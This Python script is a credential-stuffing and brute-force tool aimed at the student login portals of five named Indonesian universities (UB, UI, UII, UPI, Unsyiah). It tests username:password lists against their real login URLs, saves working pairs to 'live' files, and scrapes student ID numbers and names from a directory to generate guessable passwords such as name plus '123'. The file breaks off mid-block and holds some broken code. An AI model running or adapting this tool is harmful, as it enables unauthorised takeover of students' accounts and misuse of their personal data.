import time, sys
from time import sleep
C = '\x1b[96m'
Y = '\x1b[93m'
G = '\x1b[92m'
R = '\x1b[91m'
NC = '\x1b[m'
DG = '\033[2;32m'
DW = '\033[2;37m'
DC = '\033[2;36m'
BW = '\x1b[47;30m'
BR = '\x1b[47;41m'
def lg():
  os.system('clear')
  print(f' • {BR}Created By de@hdies{NC} • • •')
  print(f' • {BW}Brutforce Account University of Indonesia{NC} • • •')
  print(f'•  {Y}Main Menu {NC}:')
  print(f'•    {C}1{NC}) Scrap {G}UB{NC}     {C}4{NC}) Scrap {G}UPI{NC}')
  print(f'•    {C}2{NC}) Scrap {G}UI{NC}     {C}5{NC}) Scrap {G}UNSYIAH{NC}')
  print(f'•    {C}3{NC}) Scrap {G}UII{NC}    {C}6{NC}) Scrap {G}NIM {NC}')
  print(f'•    {R}x{NC}) {R}Keluar{NC}')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
def exitst():
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  exit(f'{NC}•    {R}GoodBye{NC}..!!')
def done():
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
  print(f'{NC}•    {Y}DONE {NC}=> {C}Scanning Selesai{NC}..!!')
  print(f'{NC}•    {G}LIVE {NC}=> {G}{len(found)}{Y} Akun{NC}')
  print(f'{NC}•    {R}DIES {NC}=> {R}{len(error)}{Y} Akun{NC}')
def doneGrab():
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
  print(f'{NC} •  ✓{G} SELESAI{NC}..!!')
  print(f'{NC} • {R}Hasil {C}{len(found)} {Y}NIM {NC}')
  print(f'{NC} • {Y}Tersimpan Di {NC}=> {C}Forlap.txt{NC}')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
def tungs(x):
  for remaining in range(x, 0, -1):
    sys.stdout.write('{} • {}Mohon Tunggu.   \r'.format(NC, DW, remaining))
    sleep(0.25)
    sys.stdout.write('{} • {}Mohon Tunggu..  \r'.format(NC, DW, remaining))
    sleep(0.25)
    sys.stdout.write('{} • {}Mohon Tunggu..! \r'.format(NC, DW, remaining))
    sleep(0.25)
    sys.stdout.write('{} • {}Mohon Tunggu..!!\r'.format(NC, DW, remaining))
    sleep(0.25)
try:
  import pip, os, time, sys, json, random, platform, urllib.parse, urllib.request, requests.packages.urllib3, base64
  requests.packages.urllib3.disable_warnings()
  from multiprocessing.pool import ThreadPool
  import requests as req
  from bs4 import BeautifulSoup as bs
except ImportError:
  lg()
  print(f'{NC} • {R}Module Dibutuhkan..{NC}!!')
  print(f'{NC} • {Y}Mencoba Untuk Menginstall{NC}..!!')
  sleep(3)
  lg()
  tungs(3)
  os.system('clear')
  os.system('apt-get upgrade -y')
  os.system('python -m pip install --upgrade pip')
  os.system('python -m pip install requests bs4')
  lg()
  tungs(3)
  print(f'{NC} • {G}Semua Module Terinstall{NC}..!!')
  print(f'{NC} • {C}Silahkan Jalankan Ulang Tools{NC}..!!')
  sleep(3)
  exit()
except KeyboardInterrupt:
  exit(f'{NC}\n•    {R}Keyboard Interupted{NC}..!!')
except IndexError:
  print(f'{NC}•    {R}Pastikan Jaringan Stabil{NC}..!!')
  sleep(1)
  exitst()
else:
  found = []
  error = []

  def logins():
    handlew = open('.keys', 'w')
    enkeys = base64.b64encode(keys.encode('utf-8'))
    resen = str(enkeys, 'utf-8')
    handlew.write(resek)
    handlew.close()
    lg()
    
      
  def ub(List):
    with open(List, 'r') as (f):
      lines = f.readlines()
      count = 0
      sleep(1)
      for line in lines:
        data = line.strip()
        user = data.split(':')[0]
        pswd = data.split(':')[1]
        if len(data) > 0:
          ses = req.Session()
          url = 'https://siam.ub.ac.id/index.php'
          raw = ses.get(url).text
          tok = bs(raw, 'html.parser').findAll('input')
          dat = {'status_loc':tok, 'lat':tok, 'long':tok, 
                  'username': user, 'password': pswd, 'login':'Masuk'}
          gas = ses.post(url, data=dat).text
          res = bs(gas, 'html.parser').find('title')
          if res.text == 'Sistem Informasi Akademik Mahasiswa':
            count += 1
            print(f'{NC}  • {DC}{count}{NC}){G} LIVE {NC}=>{G} {user}{NC} | {G}{pswd}')
            found.append(f'{data}')
            with open('ub_live.txt', 'a') as (s):
              s.write(f'[ LIVE ] {user}:{pswd} => Coded By de@hdies\n')
          else:
            count += 1
            print(f'{NC}  • {DC}{count}{NC}){R} DIES {NC}=>{R} {user}{NC} | {R}{pswd}')
            error.append(f'{data}')
      done()
      print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}ub_live.txt{NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UB    {NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  def ui(List):
    with open(List, 'r') as (f):
      lines = f.readlines()
      count = 0
      sleep(1)
      for line in lines:
        data = line.strip()
        user = data.split(':')[0]
        pswd = data.split(':')[1]
        if len(data) > 0:
          ses = req.Session()
          url = 'https://sso.ui.ac.id/cas/login'
          raw = ses.get(url).text
          tok = bs(raw, 'html.parser').findAll('input')
          dat = {'username':user,  'password':pswd, 
           'lt':tok[2]['value'], 
           'execution':tok[3]['value'], 
           '_eventId':'submit'}
          res = ses.post(url, data=dat).headers
          try:
            count += 1
            mantap = res['Set-Cookie']
            print(f'{NC}  • {DC}{count}{NC}){G} LIVE {NC}=>{G} {user}{NC} | {G}{pswd}')
            found.append(f'{data}')
            with open('ui_live.txt', 'a') as (s):
              s.write(f'[ LIVE ] {user}:{pswd} => Coded By de@hdies\n')
          except:
            print(f'{NC}  • {DC}{count}{NC}){R} DIES {NC}=>{R} {user}{NC} | {R}{pswd}')
            error.append(f'{data}')
      done()
      print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}ui_live.txt{NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UI    {NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  def uii(List):
    with open(List, 'r') as (f):
      lines = f.readlines()
      count = 0
      sleep(1)
      for line in lines:
        data = line.strip()
        user = data.split(':')[0]
        pswd = data.split(':')[1]
        if len(data) > 0:
          ses = req.Session()
          url = 'https://cloud-api.uii.ac.id/v1/login'
          ro = req.options(url, verify=False)
          headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 4.4.2; SAMSUNG-SM-T537A Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/35.0.1916.141 Safari/537.36',
                 'Referer': 'https://gateway.uii.ac.id/account/login'}
          data = {'kd_member': user, 'password': pswd}
          rp = req.post(url, headers=headers, data=data, verify=False)
          ggl = 'Username atau password salah'
          if ggl in rp.text:
              count += 1
              print(f'{NC}  • {DC}{count}{NC}){R} DIES {NC}=>{R} {user}{NC} | {R}{pswd}')
              error.append(f'{data}')
          else:
            count += 1
            print(f'{NC}  • {DC}{count}{NC}){G} LIVE {NC}=>{G} {user}{NC} | {G}{pswd}')
            found.append(f'{data}')
            with open('uii_live.txt', 'a') as (s):
              s.write(f'[ LIVE ] {user}:{pswd} => Coded By de@hdies\n')
      done()
      print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}uii_live.txt{NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UII    {NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  def upi(List):
    with open(List, 'r') as (f):
      lines = f.readlines()
      count = 0
      sleep(1)
      for line in lines:
        data = line.strip()
        user = data.split(':')[0]
        pswd = data.split(':')[1]
        if len(data) > 0:
          ses = req.Session()
          url = 'https://sso.upi.edu/cas/login'
          raw = ses.get(url).text
          tok = bs(raw, 'html.parser').findAll('input')[2]['value']
          dat = {'username':user,  'password':pswd, 
          'execution':tok, '_eventId':'submit', 'submit':'LOGIN'}
          gas = ses.post(url, data=dat).text
          res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
          if res == 'success':
            count += 1
            print(f'{NC}  • {DC}{count}{NC}){G} LIVE {NC}=>{G} {user}{NC} | {G}{pswd}')
            found.append(f'{data}')
            with open('upi_live.txt', 'a') as (s):
              s.write(f'[ LIVE ] {user}:{pswd} => Coded By de@hdies\n')
          else:
            count += 1
            print(f'{NC}  • {DC}{count}{NC}){R} DIES {NC}=>{R} {user}{NC} | {R}{pswd}')
            error.append(f'{data}')
      done()
      print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}upi_live.txt{NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UPI    {NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  def unsyiah(List):
    with open(List, 'r') as (f):
      lines = f.readlines()
      count = 0
      sleep(1)
      for line in lines:
        data = line.strip()
        user = data.split(':')[0]
        pswd = data.split(':')[1]
        if len(data) > 0:
          ses = req.Session()
          url = 'https://simkuliah.unsyiah.ac.id/index.php/login'
          dat = {'username':user,  'password':pswd, 
            'submit':'submit'}
          raw = req.post(url, data=dat, verify=False, timeout=10).text
          sta = bs(raw, 'html.parser').h5.get_text()
          if sta == 'Absenkan Mahasiswa':
            count += 1
            print(f'{NC}  • {DC}{count}{NC}){G} LIVE {NC}=>{G} {user}{NC} | {G}{pswd}')
            found.append(f'{data}')
            with open('unsyiah_live.txt', 'a') as (s):
              s.write(f'[ LIVE ] {user}:{pswd} => Coded By de@hdies\n')
          else:
            count += 1
            print(f'{NC}  • {DC}{count}{NC}){R} DIES {NC}=>{R} {user}{NC} | {R}{pswd}')
            error.append(f'{data}')
      done()
      print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}unsyiah_live.txt{NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UPI    {NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  def stat(u):
    try:
      x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
      z = int(x.split('/')[7:][0])//20
      return z
    except:
      x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[0]['href']
      z = int(x.split('/')[7:][0])//20
      return z
  def collect(u):
    raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
    for i in range(len(raw)-1):
      dat = raw[i+1].findAll('td')
      found.append({'nim': dat[1].text.replace(' ',''), 'nama' : dat[2].text})
  def cut(x):
    _ = x.split('/')[:7]
    _ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
    return _
  def mm():
    os.system('clear')
    try:
      
        lg()
        Pilih_MainMenu = input(f' • {Y}Pilih Menu {NC}=>{DW} ')
        if Pilih_MainMenu == '':
          print(f'{NC}•    {R}Kesalahan Input{NC}..!!')
          sleep(1)
          mm()
        elif Pilih_MainMenu == '1':
          List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
          print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UB    {NC}')
          ub(List)
        elif Pilih_MainMenu == '2':
          List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
          print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UI    {NC}')
          ui(List)
        elif Pilih_MainMenu == '3':
          List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
          print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UII    {NC}')
          uii(List)
        elif Pilih_MainMenu == '4':
          List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
          print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UPI    {NC}')
          upi(List)
        elif Pilih_MainMenu == '5':
          List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
          print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW} UNSYIAH {NC}')
          unsyiah(List)
        elif Pilih_MainMenu == '6':
          os.system('clear')
          print(f'{NC} • {BR}Created By de@hdies{NC} • • •')
          print(f' • {BW}Brutforce Account University of Indonesia{NC} • • •')
          print(f'•  {Y}Menu Grab {NC}:')
          print(f'•    {C}01{NC}) GRAB {G}NIM{NC}            {C}11{NC}) GRAB {G}NIM{NC}:{G}nama1-4{NC}')
          print(f'•    {C}02{NC}) GRAB {G}NIM{NC}:{G}NIM{NC}        {C}12{NC}) GRAB {G}NIM{NC}:{G}Nama1-4{NC}')
          print(f'•    {C}03{NC}) GRAB {G}NIM{NC}:{G}nama{NC}       {C}13{NC}) GRAB {G}NIM{NC}:{G}@nama1-4{NC}')
          print(f'•    {C}04{NC}) GRAB {G}NIM{NC}:{G}Nama{NC}       {C}14{NC}) GRAB {G}NIM{NC}:{G}@Nama1-4{NC}')
          print(f'•    {C}05{NC}) GRAB {G}NIM{NC}:{G}@nama{NC}      {C}15{NC}) GRAB {G}NIM{NC}:{G}nama1-5{NC}')
          print(f'•    {C}06{NC}) GRAB {G}NIM{NC}:{G}@Nama{NC}      {C}16{NC}) GRAB {G}NIM{NC}:{G}Nama1-5{NC}')
          print(f'•    {C}07{NC}) GRAB {G}NIM{NC}:{G}nama123{NC}    {C}17{NC}) GRAB {G}NIM{NC}:{G}@nama1-5{NC}')
          print(f'•    {C}08{NC}) GRAB {G}NIM{NC}:{G}Nama123{NC}    {C}18{NC}) GRAB {G}NIM{NC}:{G}@Nama1-5{NC}')
          print(f'•    {C}09{NC}) GRAB {G}NIM{NC}:{G}@nama123{NC}   {C}19{NC}) GRAB {G}NIM{NC}:{G}ALL_in_1{NC}')
          print(f'•    {C}10{NC}) GRAB {G}NIM{NC}:{G}@Nama123{NC}   {R}00{NC}) {Y}Kembali{NC}')
          print(f'•    {R}x{NC}) {R}Keluar{NC}')
          print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
          Pilih_MenuGrab = input(f' • {Y}Pilih Menu {NC}=>{DW} ')
          if Pilih_MenuGrab == '':
            print(f'{NC}•    {R}Kesalahan Input{NC}..!!')
            sleep(1)
            mm()
          elif Pilih_MenuGrab == '1':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
              __ = json.loads(json.dumps(found[_]))['nim']
              try:
                with open('Forlap.txt','a') as o_:
                  o_.write(__+'\n')
              except:
                with open('Forlap.txt','a') as o_:
                  o_.write(__+'\n')
            doneGrab()
          elif Pilih_MenuGrab == '2':
            _A = cut(input(f'{NC} • {G}Masukan Link {W}=> {C}'))
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
              __ = json.loads(json.dumps(found[_]))['nim']
              try:
                with open('Forlap.txt','a') as o_:
                  o_.write(__+':'+__+'\n')
              except:
                with open('Forlap.txt','a') as o_:
                  o_.write(__+':'+__+'\n')
            doneGrab()
          elif Pilih_MenuGrab == '3':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'\n')
            doneGrab()
          elif Pilih_MenuGrab == '4':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'\n')
            doneGrab()
          elif Pilih_MenuGrab == '5':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'\n')
            doneGrab()
          elif Pilih_MenuGrab == '6':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'\n')
            doneGrab()
          elif Pilih_MenuGrab == '7':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'123\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'123\n')
            doneGrab()
          elif Pilih_MenuGrab == '8':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'123\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'123\n')
            doneGrab()
          elif Pilih_MenuGrab == '9':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'123\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'123\n')
            doneGrab()
          elif Pilih_MenuGrab == '10':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'123\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'123\n')
            doneGrab()
          elif Pilih_MenuGrab == '11':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'1234\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'1234\n')
            doneGrab()
          elif Pilih_MenuGrab == '12':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'1234\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'1234\n')
            doneGrab()
          elif Pilih_MenuGrab == '13':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'1234\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'1234\n')
            doneGrab()
          elif Pilih_MenuGrab == '14':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'1234\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'1234\n')
            doneGrab()
          elif Pilih_MenuGrab == '15':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'12345\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].lower()+'12345\n')
            doneGrab()
          elif Pilih_MenuGrab == '16':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'12345\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+x[0].title()+'12345\n')
            doneGrab()
          elif Pilih_MenuGrab == '17':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'12345\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].lower()+'12345\n')
            doneGrab()
          elif Pilih_MenuGrab == '18':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'12345\n')
                except:
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':@'+x[0].title()+'12345\n')
            doneGrab()
          elif Pilih_MenuGrab == '19':
            _A = cut(input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} '))
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
            _B = stat(_A)
            for _ in range(int(_B)):
              print(f'   • {G}DONE {NC}=> {Y}Grabbing Ke {NC}: {C}{_+1}{NC}')
              collect(f'{_A}/{_*20}')
            for _ in range(len(found)):
                __ = json.loads(json.dumps(found[_]))['nim']
                ___ = json.loads(json.dumps(found[_]))['nama']
                try:
                  x = ___.split(' ')
                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+__+'\n')
                    o_.write(__+':'+x[0].lower()+'\n')
                    o_.write(__+':'+x[0].title()+'\n')
                    o_.write(__+':@'+x[0].lower()+'\n')
                    o_.write(__+':@'+x[0].title()+'\n')
                    o_.write(__+':'+x[0].lower()+'123\n')
                    o_.write(__+':'+x[0].title()+'123\n')
                    o_.write(__+':@'+x[0].lower()+'123\n')
                    o_.write(__+':@'+x[0].title()+'123\n')
                    o_.write(__+':'+x[0].lower()+'1234\n')
                    o_.write(__+':'+x[0].title()+'1234\n')
                    o_.write(__+':@'+x[0].lower()+'1234\n')
                    o_.write(__+':@'+x[0].title()+'1234\n')
                    o_.write(__+':'+x[0].lower()+'1235\n')
                    o_.write(__+':'+x[0].title()+'12345\n')
                    o_.write(__+':@'+x[0].lower()+'1235\n')
                    o_.write(__+':@'+x[0].title()+'12345\n')
                    o_.write(__+':'+x[0].lower()+'12356\n')
                    o_.write(__+':'+x[0].title()+'123456\n')
                    o_.write(__+':@'+x[0].lower()+'12356\n')
                    o_.write(__+':@'+x[0].title()+'123456\n')
                    o_.write(__+':'+x[0].lower()+'123567\n')
                    o_.write(__+':'+x[0].title()+'1234567\n')
                    o_.write(__+':@'+x[0].lower()+'123567\n')
                    o_.write(__+':@'+x[0].title()+'1234567\n')
                    o_.write(__+':'+x[0].lower()+'1235678\n')
                    o_.write(__+':'+x[0].title()+'12345678\n')
                    o_.write(__+':@'+x[0].lower()+'1235678\n')
                    o_.write(__+':@'+x[0].title()+'12345678\n')
                except:
